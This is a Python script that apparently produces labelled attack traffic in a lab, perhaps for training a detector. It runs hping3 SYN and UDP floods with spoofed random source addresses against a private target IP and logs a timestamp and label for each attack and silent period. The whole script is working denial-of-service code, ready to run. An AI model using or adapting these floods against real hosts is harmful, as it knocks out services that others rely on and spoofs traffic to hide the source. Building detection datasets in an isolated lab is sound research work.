import subprocess
import time
import os

TARGET_IP = "10.0.106.27"
LOG_FILE = "labels_map.txt"

def run_scenario(name, label, hping_args, duration):
    timestamp = time.time()
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp},{label},{name}\n")
    
    print(f"[!] {time.strftime('%H:%M:%S')} - Starting {name}...")
    
    if hping_args:
        # Direct Linux command (no 'wsl')
        cmd = ["sudo", "hping3"] + hping_args + [TARGET_IP]
        
        # Start process
        proc = subprocess.Popen(cmd)
        time.sleep(duration)
        
        print(f"[#] Stopping {name}...")
        
        # Kill hping3 safely
        subprocess.run(["sudo", "killall", "hping3"])
        proc.terminate()
    else:
        time.sleep(duration)

# --- RUN THE ATTACK ---
print(f"Targeting Victim at {TARGET_IP}")

try:
    # 1. Standard SYN Flood
    run_scenario(
        "Standard SYN Flood",
        1,
        ["-S", "-p", "80", "-c", "5000", "-i", "u2000", "--rand-source"],
        20
    )
    
    # 2. Silence
    run_scenario("Normal/Silence", 0, None, 10)
    
    # 3. UDP Flood
    run_scenario(
        "Standard UDP Flood",
        1,
        ["-2", "-p", "53", "-c", "5000", "-i", "u2000", "--rand-source"],
        20
    )

except Exception as e:
    print(f"Error: {e}")

print("Attack Cycle Complete.")